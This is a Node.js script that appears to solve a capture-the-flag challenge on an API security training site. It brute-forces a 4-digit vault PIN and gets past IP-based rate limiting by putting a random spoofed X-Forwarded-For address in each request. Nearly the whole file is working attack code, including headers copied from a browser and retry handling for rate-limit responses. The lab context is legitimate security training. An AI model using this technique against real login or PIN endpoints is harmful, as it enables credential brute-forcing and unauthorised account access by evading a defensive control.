/*
CHALLENGE DESCRIPTION

Think you're clever with your brute force attacks? We've added rate limiting to our vault!

This challenge presents a password vault protected by a 4-digit PIN, but this time with IP-based rate limiting to prevent brute force attacks.

Your mission: Analyze the rate limiting mechanism, identify its weakness, and bypass it to access the vault and retrieve the flag.
*/

const VAULT_API_URL = 'https://rate-limited.ac25.apisecuniversity.com/api/vault';
const MIN_PIN = 0;
const MAX_PIN = 9999;
const REQUEST_TIMEOUT_MS = 5000;
const BASE_REQUEST_DELAY_MS = 10;
const ERROR_RETRY_DELAY_MS = 3000;
const MAX_ATTEMPTS_PER_PIN = 3;

const BASE_HEADERS = {
  'Content-Type': 'application/json',
  'Sec-Ch-Ua-Platform': '"Linux"',
  'Accept-Language': 'en-GB,en;q=0.9',
  'Sec-Ch-Ua': '"Chromium";v="135", "Not-A.Brand";v="8"',
  'Sec-Ch-Ua-Mobile': '?0',
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
  'Accept': '*/*',
  'Origin': 'https://rate-limited.ac25.apisecuniversity.com',
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Dest': 'empty',
  'Referer': 'https://rate-limited.ac25.apisecuniversity.com/',
  'Accept-Encoding': 'gzip, deflate, br',
  'Priority': 'u=1, i',
};

const delay = ms => new Promise(res => setTimeout(res, ms));

const generateIpAddress = () => {
  const thirdOctet = Math.floor(Math.random() * 255);
  const fourthOctet = Math.floor(Math.random() * 253) + 1;
  return `192.168.${thirdOctet}.${fourthOctet}`;
};

const makeHttpRequest = async (url, method, headers = {}, body = null, timeoutMs = REQUEST_TIMEOUT_MS) => {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  const fetchOptions = {
    method: method,
    headers: { ...headers },
    signal: controller.signal,
  };

  if (body) {
    if (fetchOptions.headers['Content-Type'] === 'application/json' && typeof body !== 'string') {
      try {
        fetchOptions.body = JSON.stringify(body);
      } catch (e) {
        clearTimeout(timeoutId);
        return { success: false, status: null, data: null, rawText: '', headers: {}, error: `JSON stringify error: ${e.message}` };
      }
    } else {
      fetchOptions.body = body;
    }
    if (typeof fetchOptions.body === 'string' && !fetchOptions.headers['Content-Length']) {
      fetchOptions.headers['Content-Length'] = Buffer.byteLength(fetchOptions.body).toString();
    }
  }

  try {
    const response = await fetch(url, fetchOptions);
    clearTimeout(timeoutId);

    const responseHeaders = {};
    response.headers.forEach((value, key) => {
      responseHeaders[key] = value;
    });
    const rawText = await response.text();
    let responseData = null;

    if (responseHeaders['content-type']?.includes('application/json')) {
      try {
        responseData = JSON.parse(rawText);
      } catch (e) {
        return {
          success: false,
          status: response.status,
          data: null,
          rawText: rawText,
          headers: responseHeaders,
          error: `Failed to parse JSON: ${e.message}`,
        };
      }
    }

    const httpSuccess = response.status >= 200 && response.status < 300;
    return {
      success: httpSuccess,
      status: response.status,
      data: responseData,
      rawText: rawText,
      headers: responseHeaders,
      error: httpSuccess ? null : `HTTP error ${response.status}`,
    };
  } catch (error) {
    clearTimeout(timeoutId);
    const errorMessage = error.name === 'AbortError' ? `Request timed out after ${timeoutMs / 1000}s` : `Network error: ${error.message}`;
    return { success: false, status: null, data: null, rawText: '', headers: {}, error: errorMessage };
  }
};

const attemptPinVerification = async (pinCode, ipAddress) => {
  const payload = { pin: pinCode };
  const specificHeaders = {
    ...BASE_HEADERS,
    'X-Forwarded-For': ipAddress,
  };
  return makeHttpRequest(VAULT_API_URL, 'POST', specificHeaders, payload);
};

const main = async () => {
  let currentPin = MIN_PIN;
  let attemptRetriesForPin = 0;
  let wasRateLimited = false;

  while (currentPin <= MAX_PIN) {
    const pinString = currentPin.toString().padStart(4, '0');
    const ipAddress = generateIpAddress();
    let userMessage = `Trying PIN ${pinString} (IP: ${ipAddress})...\r`;

    if (attemptRetriesForPin > 0) {
      userMessage = `Retrying PIN ${pinString} (IP: ${ipAddress}, attempt ${attemptRetriesForPin + 1}/${MAX_ATTEMPTS_PER_PIN})...\r`;
    } else if (wasRateLimited) {
      userMessage = `Retrying PIN ${pinString} (IP: ${ipAddress}) after rate limit delay...\r`;
      wasRateLimited = false;
    }
    process.stdout.write(userMessage);

    const response = await attemptPinVerification(pinString, ipAddress);
    let advanceToNextPin = false;
    let requestDelayMs = BASE_REQUEST_DELAY_MS;

    if (response.success && response.rawText.includes('"success":true')) {
      process.stdout.write('\n');
      console.log(`PIN ${pinString} successful! Response:`);
      console.log(response.data ? JSON.stringify(response.data) : response.rawText);
      process.exit(0);
    }

    process.stdout.write('\n');

    switch (response.status) {
      case 429: {
        const retryAfterHeader = response.headers['retry-after'] || response.headers['Retry-After'];
        let retryAfterSeconds = 10;
        if (retryAfterHeader) {
          const parsedSeconds = parseInt(retryAfterHeader, 10);
          if (!isNaN(parsedSeconds) && parsedSeconds > 0) {
            retryAfterSeconds = parsedSeconds;
          }
        }
        console.log(`PIN ${pinString}: Rate limited (429). Waiting ${retryAfterSeconds}s.`);
        requestDelayMs = retryAfterSeconds * 1000;
        wasRateLimited = true;
        attemptRetriesForPin = 0;
        break;
      }
      case 503:
        console.log(`PIN ${pinString}: Service unavailable (503).`);
        attemptRetriesForPin++;
        if (attemptRetriesForPin >= MAX_ATTEMPTS_PER_PIN) {
          console.log(`PIN ${pinString}: Max retries for 503. Moving to next PIN.`);
          advanceToNextPin = true;
        } else {
          console.log(`Retrying in ${ERROR_RETRY_DELAY_MS / 1000}s.`);
          requestDelayMs = ERROR_RETRY_DELAY_MS;
        }
        break;
      case null:
        console.log(`PIN ${pinString}: Request failed. Error: ${response.error}`);
        attemptRetriesForPin++;
        if (attemptRetriesForPin >= MAX_ATTEMPTS_PER_PIN) {
          console.log(`PIN ${pinString}: Max request failure retries. Moving to next PIN.`);
          advanceToNextPin = true;
        } else {
          console.log(`Retrying in ${ERROR_RETRY_DELAY_MS / 1000}s.`);
          requestDelayMs = ERROR_RETRY_DELAY_MS;
        }
        break;
      default:
        console.log(
          `PIN ${pinString}: Failed. Status: ${response.status}. Response: ${
            response.data ? JSON.stringify(response.data) : response.rawText.substring(0, 100)
          }`
        );
        advanceToNextPin = true;
        break;
    }

    if (advanceToNextPin) {
      currentPin++;
      attemptRetriesForPin = 0;
    }

    if (currentPin <= MAX_PIN) {
      await delay(requestDelayMs);
    }
  }

  process.stdout.write('\n');
  console.log(
    `All PINs from ${MIN_PIN.toString().padStart(4, '0')} to ${MAX_PIN.toString().padStart(4, '0')} attempted. No PIN found for ${VAULT_API_URL}.`
  );
  process.exit(1);
};

main().catch(error => {
  process.stdout.write('\n');
  console.error(`Unhandled application error: ${error.message}`);
  console.error(error.stack);
  process.exit(1);
});
